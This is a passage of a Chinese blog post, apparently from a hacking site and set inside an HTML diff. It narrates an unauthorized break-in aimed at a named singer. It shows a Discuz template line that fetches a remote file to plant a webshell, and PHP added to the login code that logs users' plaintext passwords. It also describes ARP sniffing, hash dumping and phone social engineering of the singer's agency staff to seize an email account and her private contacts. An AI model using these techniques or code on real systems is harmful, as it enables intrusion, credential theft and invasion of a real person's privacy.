<br>ＮiＫai&#160; <br>我可以给你账号    <br>我说</p>  <p>嗯,好的!&#160; <br>ＮiＫai&#160; <br>中国工商银行上海市新灵路支行    <br>受款帐号：10011XXXXX21135XXXX&#160; <br>户名：XXX&#160; <br><a href="http://www.xxx.com/abouts/payment.php" target="_blank" rel="external">http://www.xxx.com/abouts/payment.php</a>    <br>银行汇款（到账时间部分实时，部分1-5工作日）    <br>我说    <br>好的 我打的时候联系下你</p>  <p>ＮiＫai&#160; <br>好的!&#160; <br>我说    <br>麻烦了。</p>  <p>成功嗅探到管理员的登录密码.接着进入后台   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image003_thumb.jpg" width="527" height="365"></a></p>  <p>在模板任意位置插入   <br>{eval copy(‘<a href="http://www.3est.com/mars.txt" target="_blank" rel="external">http://www.3est.com/mars.txt</a>‘, DISCUZ_ROOT.’./forumdata/shell.php’);&#160; <br>然后更新缓存.结果他的缓存目录竟然无写入权限…&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image004_thumb.jpg" width="410" height="321"></a></p>  <p>没办法了   <br>在后台查看了Cyndi的注册资料和最后登录IP地址.IP138查一下是台湾的.这差不多就是她家IP了.光拿到这个还不够,继续渗透…主要是拿Cyndi的密码,那只有Webshell或者服务器权限的情况下才能拿下数据库.这是一件比较难的差事.ARP到3389登录密码成功率很低的.只嗅探Ftp Mysql RDP ，过了2天嗅探出FTP了    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image006_thumb.jpg" width="552" height="396"></a></p>  <p>成功登录FTP之后，传个webshell   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image008.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image008_thumb.jpg" width="558" height="542"></a></p>  <p><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image009.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009" border="0" alt="clip_image009" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image009_thumb.jpg" width="558" height="542"></a></p>  <p>结果服务器权限很死，ping 下是su8的FTP&#160; <br>然后通过 空虚浪子心写的EXP提到服务器！    <br>然后BT的事情出现了。    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image011.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image011" border="0" alt="clip_image011" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image011_thumb.jpg" width="576" height="376"></a></p>  <p>C盘没访问权限，打开属性提升用户组   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image012.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image012_thumb.jpg" width="507" height="484"></a></p>  <p>这个服务器安全做的不错，一堆东西没权限运行。</p>  <p>既然这样，在看看注册表是否被封锁了。什么都不让下载，更别说复制了。   <br>只能靠WebShell上传个cmd.exe来克隆下超级管理    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image014.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image014_thumb.jpg" width="634" height="481"></a></p>  <p><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image016.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image016_thumb.jpg" width="582" height="477"></a></p>  <p>至此，第一阶段渗透完毕！</p>  <p>去数据库找王心凌密码，DZ采用的是salt方式，随机获得一个字符串，然后把明文密码MD5之后，再与随机字符串连接起来之后，再次MD5。   <br>这样可极大的提高安全系数。    <br>只好在记录明文密码了。    <br>修改uc_client目录下的client.php 在    <br>function uc_user_login($username, $password, $isuid = 0, $checkques = 0, $questionid = ‘’, $answer = ‘’) {&#160; <br>下加入如上代码,在网站admin目录下生成include.txt</p>  <p>$ip=$_SERVER[‘REMOTE_ADDR’];&#160; <br>$showtime=date(&quot;Y-m-d H:i:s&quot;);&#160; <br>$record=&quot;&quot;.$username.&quot; ——–&quot;.$password.&quot; IP:&quot;.$ip.&quot; Time:&quot;.$showtime.&quot;\r\n&quot;;&#160; <br>$handle=fopen(‘./admin/include.txt’,’a+’);&#160; <br>$write=fwrite($handle,$record);&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image017.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017" border="0" alt="clip_image017" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image017_thumb.jpg" width="526" height="290"></a></p>  <p>等着王心凌上论坛。   <br>下面做其他工作。    <br>先抓取下管理的Hash&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image019.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019" border="0" alt="clip_image019" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image019_thumb.jpg" width="574" height="181"></a></p>  <p>跑出密码！   <br>继续把服务器数据库连接密码，缓存密码，FTP密码都收集下！    <br>去ip866查询域名的注册邮箱是<a href="mailto:xx@yahoo.cn" target="_blank" rel="external">xx@yahoo.cn</a>，然后反查下出现了Cyndi.com.cn这个域名，让我感到<em>**</em>了。先看看他域名注册的地方，    <br>一个是新网，一个是万网，先解决新网的，百度搜索了下他的信息很散，不过经过一下午的搜索基本信息已经确定。    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image020.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020" border="0" alt="clip_image020" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image020_thumb.jpg" width="419" height="630"></a></p>  <p>接着试了几个密码进来了。   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image022.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image022" border="0" alt="clip_image022" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image022_thumb.jpg" width="551" height="447"></a></p>  <p>很快，把所有密码整理下，然后猜想下就出来了。   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image024.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image024" border="0" alt="clip_image024" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image024_thumb.jpg" width="530" height="391"></a></p>  <p>继续搜索资料，找DNS管理页面</p>  <p><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image026.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image026" border="0" alt="clip_image026" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image026_thumb.jpg" width="538" height="248"></a></p>  <p>然后社工到QQ密码，然后进入QQ网络硬盘，找有价值信息，成功拿到cyndi.com.cn管理权限。</p>  <p>经过收集资料，在百度贴吧找到她ID，搜狐BLOG 台湾雅虎BLOG&#160; <br>经过调查发现那个搜狐BLOG是她的经纪人帮她发的，    <br>只有翻墙去台湾BLOG，    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image028.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image028" border="0" alt="clip_image028" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image028_thumb.jpg" width="420" height="720"></a></p>  <p>2010-1-13 20:25&#160; <br>收集了点资料，    <br>1、起初为了社工心凌创办的经济公司的EMAIL，依靠的是雅虎订阅信息得到EMAIL，然后通过找回密码，密码问题是她姓名，更何况我又不知道她是谁，与他们公司的关系及职位，我猜想，他们公司人数不会太多，估计也就两三个。    <br>2、百度找到他们公司电话，打过去，然后说，请问您的贵姓 接着一个女的说 ？好甜美的话语啊，我于是蠢蠢欲动了几秒，接着说，女士您贵姓，她说姓米，我说 米小姐，请问怎么能够拿到心凌的签名，她给我了个电话让我联系一个唱片公司。接着挂电话了    <br>3、过半天之后 再打电话给她经济公司，说请问张XX小姐在么？    <br>4、我听了语音，是另外个女的接的电话，她说请问你是不是找张小姐，接着找个借口挂了电话！    <br>5、然后登录Email通过密码提示找回密码，输入姓名，成功进入！    <br>进入邮箱打开通讯录，拿到了本人的手机，王心凌的私人EMAIL和手机，然后这个密码正好是她EMAIL的。。就不截图了，免的被人破坏。    <br>渗透结束！有时间找她聊聊哈。    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image030.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image030" border="0" alt="clip_image030" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image030_thumb.jpg" width="624" height="449"></a></p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/831.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/831.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/831.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/831.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/834.seo/">
-        ← 10行代码开发完12306订票系统
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/828.seo/">
-        如何对付指纹打卡机 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/渗透/">渗透</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/834.seo/" title="10行代码开发完12306订票系统">
+  <strong>Prev:</strong><br/>
+  <span>
+  10行代码开发完12306订票系统</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/828.seo/"  title="如何对付指纹打卡机">
+ <strong>Next:</strong><br/> 
+ <span>如何对付指纹打卡机
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-对王心凌的一次渗透过程" data-title="对王心凌的一次渗透过程" data-url="http://ha.cker.in/831.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
